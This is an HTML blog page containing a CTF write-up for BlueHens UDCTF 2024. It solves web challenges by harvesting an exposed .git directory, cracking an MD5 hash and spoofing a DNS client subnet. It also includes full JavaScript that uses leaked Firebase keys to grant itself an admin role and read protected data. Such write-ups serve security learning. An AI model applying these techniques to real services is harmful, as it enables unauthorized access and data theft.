@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>BlueHens UDCTF 2024 - WriteUp &ndash; TheMrEviil Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+
+
+
+
+
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">TheMrEviil Blog</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="http://localhost:1313/post/" title="Posts">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>BlueHens UDCTF 2024 - WriteUp</h1>
+    </header>
+    <div class="content__body">
+        <h2 id="web---training-problem-intro-to-web">WEB - Training Problem: Intro to Web</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>It&#39;s nice to have some training problems.
+
+-ProfNinja
+
+https://bluehens-webstuff.chals.io/
+</code></pre><p>After open website my Chrome extenstion DotGit notify me about avaible .git on this site</p>
+<p><img src="/post/bluehens2024/dotgit.png" alt="image dotgit"></p>
+<p>I downloaded this and start reading logs <code>git log</code></p>
+<p><img src="/post/bluehens2024/gitlog.png" alt="image gitlog"></p>
+<p>let&rsquo;s check commit &lsquo;password based login?&rsquo;
+<img src="/post/bluehens2024/gitshow.png" alt="image gitlog"></p>
+<p>We got MD5 hash go to crackstation and lat&rsquo;s try crack password
+<img src="/post/bluehens2024/crackstation.png" alt="image gitlog"></p>
+<p>After cract we have password <code>1qaz2wsx</code> let&rsquo;s go on page from code <a href="https://bluehens-webstuff.chals.io/flagme.php?password=1qaz2wsx">https://bluehens-webstuff.chals.io/flagme.php?password=1qaz2wsx</a>
+<img src="/post/bluehens2024/url_flag.png" alt="image gitlog"></p>
+<h2 id="web---dns">WEB - DNS</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>This DNS server reveals a secret to a special IP. 
+Can you make it think you’re connecting from 127.0.0.1?
+
+dig TXT flag @129.153.36.153
+
+-JD (sr.)
+</code></pre><p>fast check in the best tool for hacking - Google
+and we have answer how do this task
+<code>dig TXT flag @129.153.36.153 +subnet=127.0.0.1</code></p>
+<p><img src="/post/bluehens2024/digsubnet.png" alt="image gitlog"></p>
+<h2 id="web---firefun-3">WEB - Firefun 3</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>Our fireplace company was all set to take off for the moon, then we had to shut it all down. All that&#39;s left is a simple landing page.
+
+-ProfNinja
+
+Dedicated to Nisala
+
+https://fire.prof.ninja/
+</code></pre><p>This task was very hard for me, I spent something like around 10 hours on this challange. but how i done this&hellip;</p>
+<p>On website we have normal static page with twice comments, but interesting information we have on 404 website</p>
+<p><img src="/post/bluehens2024/404.png" alt="image gitlog"></p>
+<p>We have <code>Firebase Command-Line Interface</code> this information change all. Quick research about Firebase (7 hours&hellip;) and nothing&hellip;  When my psyche was dying my friend from team find and send me this <code>https://fire.prof.ninja/__/firebase/init.js</code></p>
+<p>WE GOT API KEYS !!!!</p>
+<p>but I don&rsquo;t know what&rsquo;s give me this&hellip; Let&rsquo;s research more</p>
+<p>I found a lot of tools to testing this credentials. Tools like this:</p>
+<ul>
+<li><a href="https://github.com/iosiro/baserunner">https://github.com/iosiro/baserunner</a></li>
+<li><a href="https://github.com/0xbigshaq/firepwn-tool/tree/master">https://github.com/0xbigshaq/firepwn-tool/tree/master</a></li>
+</ul>
+<p>but this don&rsquo;t give me flag, in Firepwn I created user but i don&rsquo;t know collections in Firebase. In Baserunner i logged, send request and have my favourite response <code>Permission denid</code> lovley&hellip;</p>
+<p>let&rsquo;s go to documentatnion Firebase SDK and in this we got inforamtion about something interesting.</p>
+<p>FIREBASE STORAGE and we can get something from this let&rsquo;s try and write some code</p>
+<p>Start some front:</p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;pl&#34;&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;UTF-8&#34;&gt;
+    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+    &lt;title&gt;Firebase Storage Test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Lista plików z Firebase Storage&lt;/h1&gt;
+    &lt;ul id=&#34;file-list&#34;&gt;&lt;/ul&gt;
+
+    &lt;!-- Firebase SDK w wersji dla przeglądarek --&gt;
+    &lt;script src=&#34;https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js&#34;&gt;&lt;/script&gt;
+    &lt;script src=&#34;https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js&#34;&gt;&lt;/script&gt;
+        &lt;script src=&#34;https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js&#34;&gt;&lt;/script&gt;
+    &lt;script src=&#34;https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js&#34;&gt;&lt;/script&gt; &lt;!-- Dodaj Realtime Database --&gt;
+
+    &lt;!-- Własny skrypt --&gt;
+    &lt;script src=&#34;app.js&#34;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Next go to <code>app.js</code> i trying get folders but <code>PERMISSION DENID</code> after more hours in docs i found login let&rsquo;s try login using my credentials from Firepwn and we have HINT:
+<img src="/post/bluehens2024/rulesfirebase.png" alt="image gitlog"></p>
+<p>Let&rsquo;s more research (ChatGPT pleas help me and explain me what i&rsquo;m doing) and we write something like this</p>
+<pre tabindex="0"><code>const firebaseConfig = {
+  apiKey: &#34;AIzaSyBX_qnDyJ9pl_csJUprUywtAh9lUbVqPFU&#34;,
+  authDomain: &#34;udctf24.firebaseapp.com&#34;,
+  projectId: &#34;udctf24&#34;,
+  storageBucket: &#34;udctf24.firebasestorage.app&#34;,
+  databaseURL: &#34;https://udctf24-default-rtdb.firebaseio.com&#34;, 
+};
+
+firebase.initializeApp(firebaseConfig);
+const storage = firebase.storage();
+const auth = firebase.auth();
+const database = firebase.database();
+
+async function listFilesRecursively(ref, depth = 0) {
+  try {
+    const res = await ref.listAll();
+
+    res.prefixes.forEach((folderRef) =&gt; {
+      console.log(`${&#39; &#39;.repeat(depth * 2)}📂 ${folderRef.name}`);
+      listFilesRecursively(folderRef, depth + 1); 
+    });
+
+    res.items.forEach(async (itemRef) =&gt; {
+      const url = await itemRef.getDownloadURL();
+      console.log(`${&#39; &#39;.repeat(depth * 2)}📄 ${itemRef.name} - URL: ${url}`);
+    });
+  } catch (error) {
+    console.error(&#34;Error:&#34;, error);
+  }
+}
+
+function checkAdminPermissions(user) {
+  const adminRef = database.ref(`users/${user.uid}/roles/admin`);
+
+  return adminRef.once(&#39;value&#39;).then((snapshot) =&gt; {
+    const isAdmin = snapshot.exists();
+    
+      const rootRef = storage.ref().child(&#34;&#34;); 
+      listFilesRecursively(rootRef);
+   
+  }).catch((error) =&gt; {
+    console.error(&#34;Error:&#34;, error);
+  });
+}
+
+function login() {
+  const email = &#34;test@test.pl&#34;;
+  const password = &#34;test1234&#34;;
+
+  auth.signInWithEmailAndPassword(email, password)
+    .then((userCredential) =&gt; {
+      console.log(&#34;Login:&#34;, userCredential.user);
+      const user = firebase.auth().currentUser;
+      const adminRef = firebase.database().ref(`users/${user.uid}/roles/admin`);
+
+      adminRef.set(true)
+        .then(() =&gt; {
+          console.log(&#34;Admin:&#34;, user.uid);
+        })
+        .catch((error) =&gt; {
+          console.error(&#34;Error:&#34;, error);
+        });
+      checkAdminPermissions(userCredential.user);
+      readFlag()
+    })
+    .catch((error) =&gt; {
+      console.error(&#34;Error:&#34;, error.message);
+    });
+}
+function readFlag() {
+  const flagRef = database.ref(&#34;flag&#34;);
+
+  flagRef.once(&#34;value&#34;)
+    .then((snapshot) =&gt; {
+      if (snapshot.exists()) {
+        const flag = snapshot.val();
+        console.log(&#34;Flaga:&#34;, flag);
+      } else {
+        console.log(&#34;Flag not found.&#34;);
+      }
+    })
+    .catch((error) =&gt; {
+      console.error(&#34;Error:&#34;, error);
+    });
+}
+window.onload = login;
+</code></pre><p>What&rsquo;s this?</p>
+<p>We use created user to login, with default permission Firebase return image with permission rules, but we can creates or updates a reference in Realtime Database at users/{userId}/roles/admin, setting the value to true. This effectively grants the user an &ldquo;admin&rdquo; role and we can read a flag using this code :)</p>
+<p><img src="/post/bluehens2024/fire_flag.png" alt="image gitlog"></p>
+<h2 id="crypto---nonogram-pt-1-simple-enough">Crypto - Nonogram Pt. 1: Simple Enough</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>When you get past the puzzle, you now face a classic encryption / old-school stego encoding. Wrap the text you find in UDCTF{TEXTHERE}.
+
+-Grace
+
+http://www.landofcrispy.com/nonogrammer/nonogram.html?mode=play&amp;puzzle=17|15|1x4.1x4,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x8,1x2.1x2.1x4,1x2.1x2.1x2.1x2,1x2.1x2.1x2.1x2,1x6.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x2,1x2.1x3,1x9|1x1,1x8,1x9,1x1.1x2,1x1.1x1.1x1,1x12,1x12,1x1.1x1.1x1,1x1.1x1.1x2.1x1,1x9.1x1,1x8.1x1,1x1.1x2.1x2,1x2.1x3,1x9,1x6|x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x&amp;palette=white.grey.X,black..&amp;msg=df1b4ee23140ab89541134c295c4d696774c1ec8ddf6550353ef53096152657cc9e79a0300200931353c6e9aaa446c2f55684c39d4
+</code></pre><p>It&rsquo;s funny game, let&rsquo;s make this</p>
+<p><img src="/post/bluehens2024/nanogram.png" alt="image gitlog"></p>
+<p>When we make it, game give us a strings like on image. Paste to ChatGPT and we got PIXELATED</p>
+<p>Flag: <code>UDCTF{PIXELATED}</code></p>
+<p>Thats all my solutions challanges :)
+Add to RSS</p>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+<h1 class="about__title">Jakub Przepióra</h1>
+
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/jakub-przepiora" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:jakub.przepioraa@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.linkedin.com/in/jakub-przepiora/" rel="me" aria-label="Linkedin" title="Linkedin"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+        <p>
+            By TheMrEviil, 
+            2024-11-11
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+      
+      
+          
+            
+            
+                
+
+            
+          
+      
+    
+</p>
+<br /><br />
+</footer>
+
+        </div>
+    </body>
+
+</html>
